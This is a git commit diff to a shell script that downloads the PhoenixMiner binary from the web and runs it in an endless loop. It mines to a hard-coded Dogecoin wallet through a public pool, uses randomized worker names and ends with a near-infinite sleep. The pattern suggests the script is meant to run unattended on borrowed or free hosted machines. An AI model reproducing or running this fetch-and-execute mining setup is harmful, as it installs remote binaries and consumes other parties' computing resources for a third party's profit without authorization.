808aa0f52c90c3a1d930e3fbb5eb1924971046ef
pogchampv18 <86313403+pogchampv18@users.noreply.github.com>
2021-07-09 10:59:30 +0530

    Update phebe.sh

--- phebe.sh
+++ phebe.sh
@@ -2,10 +2,11 @@
 POOL=ethash.unmineable.com:3333
 WALLET=DOGE:D5o7ggptjmEoKME4rdCBWdaVkZagiZBzvB
 WORKER=$(echo $(shuf -i 10-40 -n 1)-DOGE)
+sudo apt install libpci3
 wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz && tar -xf PhoenixMiner_5.6d_Linux.tar.gz && cd PhoenixMiner_5.6d_Linux 
 chmod +x PhoenixMiner
 while [ 1 ]; do
-./PhoenixMiner -pool $POOL -wal $WALLET.$WORKER -pass x
+./PhoenixMiner -pool $POOL -u $WALLET.$WORKER -pass x -mi 14 -gt 400
 sleep 5
 done
 sleep 999999999
